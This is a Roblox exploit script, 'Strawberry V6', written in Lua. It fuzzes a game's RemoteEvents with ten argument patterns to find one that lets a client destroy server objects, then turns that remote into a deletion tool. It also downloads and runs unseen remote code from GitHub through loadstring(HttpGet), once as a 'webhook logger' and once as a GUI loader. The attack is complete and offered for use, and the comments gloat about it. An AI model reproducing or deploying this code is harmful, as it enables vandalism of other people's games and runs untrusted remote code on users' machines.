--[[
⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠁⠀

Strawberry V6
Rewritten by a random sane, made some improvements.

--]]

-- //===================[ CONFIG ]===================//

local Config = {
	ScanSafeTime = 0.1, -- Lowered for speed. If theres bugs, raise it.
	ShowScannerProgress = true,
	EnableGUIAfterScan = true,
	ExecutorName = getexecutorname and getexecutorname() or "Unknown"
}

-- //===================[ CORE ]===================//

local backdoorFound = false
local vulnerableRemote = nil
local fireWrapper = nil
local scanStartTime = tick()

local Services = {
	Players = game:GetService("Players"),
	ReplicatedStorage = game:GetService("ReplicatedStorage"),
	HttpService = game:GetService("HttpService"),
	StarterGui = game:GetService("StarterGui"),
	CoreGui = game:GetService("CoreGui"),
	Workspace = game:GetService("Workspace"),
	Debris = game:GetService("Debris"),
	RunService = game:GetService("RunService")
}

local LocalPlayer = Services.Players.LocalPlayer
local Hint = Instance.new("Hint", Services.Workspace)
Hint.Text = "STRAWBERRY V6: Scanning, be very patient. Check F9 for progress (Game might freeze)"

local function Notify(message, duration)
	pcall(function()
		Services.StarterGui:SetCore("SendNotification", {
			Title = "Strawberry V6",
			Text = tostring(message),
			Duration = duration or 5
		})
	end)
end

local function FireBackdoor(instance)
	if not backdoorFound or not fireWrapper then
		print("Strawberry: FireBackdoor called but no backdoor is loaded.")
		return
	end
	fireWrapper(instance)
end

if LocalPlayer:FindFirstChild("deletebind") then
	LocalPlayer.deletebind:Destroy()
end
local deleteBind = Instance.new("BindableEvent", LocalPlayer)
deleteBind.Name = "deletebind"
deleteBind.Event:Connect(FireBackdoor)


-- //===================[ WEBHOOK LOGGER ]===================//

local function SendWebhook()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Hook.lua"))();
end


-- //===================[ THE SCANNER ]===================//

local function IsVulnerable(remote)
	local testPart = nil
	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("RightHand") then
		testPart = LocalPlayer.Character.RightHand
	elseif LocalPlayer.StarterGear then
		testPart = LocalPlayer.StarterGear
	else
		for _, v in ipairs(Services.Workspace:GetDescendants()) do
			if v:IsA("BasePart") and not v:IsA("Terrain") and v.Name ~= "Baseplate" and not v.Anchored then
				testPart = v; break
			end
		end
	end
	if not testPart then return false end

	local originalParent = testPart.Parent
	local destroyed = false

	local testConnection = testPart.AncestryChanged:Connect(function(child, parent)
		if child == testPart and parent == nil then
			destroyed = true
		end
	end)

	-- Multi-arg fuzzing. This is what separates men from boys.
	local fuzzPatterns = {
		function() remote:FireServer(testPart) end,
		function() remote:FireServer(nil, testPart) end,
		function() remote:FireServer(nil, nil, testPart) end,
		function() remote:FireServer({testPart}) end,
		function() remote:FireServer({Target = testPart}) end,
		function() remote:FireServer("Destroy", testPart) end,
		function() remote:FireServer("delete", testPart) end,
		function() remote:FireServer("remove", testPart) end,
		function() remote:FireServer({action = "delete", object = testPart}) end,
		function() remote:FireServer(testPart.Name) end -- some remotes take names instead of instances
	}

	for i, patternFunc in ipairs(fuzzPatterns) do
		local success, err = pcall(patternFunc)
		task.wait(Config.ScanSafeTime)

		if destroyed then
			print("STRAWBERRY V6: VULNERABILITY CONFIRMED! Pattern #" .. i)
			fireWrapper = function(instance)
				local newPattern = {
					function() remote:FireServer(instance) end,
					function() remote:FireServer(nil, instance) end,
					function() remote:FireServer(nil, nil, instance) end,
					function() remote:FireServer({instance}) end,
					function() remote:FireServer({Target = instance}) end,
					function() remote:FireServer("Destroy", instance) end,
					function() remote:FireServer("delete", instance) end,
					function() remote:FireServer("remove", instance) end,
					function() remote:FireServer({action = "delete", object = instance}) end,
					function() remote:FireServer(instance.Name) end
				}
				pcall(newPattern[i])
			end
			testConnection:Disconnect()
			return true
		end
	end

	testConnection:Disconnect()
	return false
end

local function ScanForBackdoor()
	local locationsToScan = {
		Services.ReplicatedStorage,
		Services.Workspace,
		Services.StarterGui,
		game:GetService("Lighting"),
		LocalPlayer.PlayerGui
	}

	for _, root in ipairs(locationsToScan) do
		if backdoorFound then break end
		if Config.ShowScannerProgress then Hint.Text = "STRAWBERRY V6: Fuzzing remotes in " .. root:GetFullName() end

		for _, remote in ipairs(root:GetDescendants()) do
			if remote:IsA("RemoteEvent") then
				if not remote.Parent then continue end
				if remote.Parent.Name == "RobloxReplicatedStorage" then continue end

				if IsVulnerable(remote) then
					backdoorFound = true
					vulnerableRemote = remote
					return
				end
			end
		end
	end
end

-- //===================[ SCRIPT EXECUTION ]===================//

task.wait(1)
ScanForBackdoor()

if backdoorFound then
	Hint.Text = "STRAWBERRY V6: Backdoor located in " .. string.format("%.2f", tick() - scanStartTime) .. "s. Remote: " .. vulnerableRemote.Name
	Notify("Backdoor found: " .. vulnerableRemote:GetFullName(), 10)
	SendWebhook()

	if Config.EnableGUIAfterScan then
		-- load gui.
		loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/main/UI_Source/v6.lua"))()
	end

	task.wait(10)
	Hint:Destroy()
else
	Hint.Text = "STRAWBERRY V6: No backdoor found. Game dev aint dumb."
	Notify("Scan complete. No vulnerable remotes found. Lame.", 10)
	task.wait(10)
	Hint:Destroy()
end
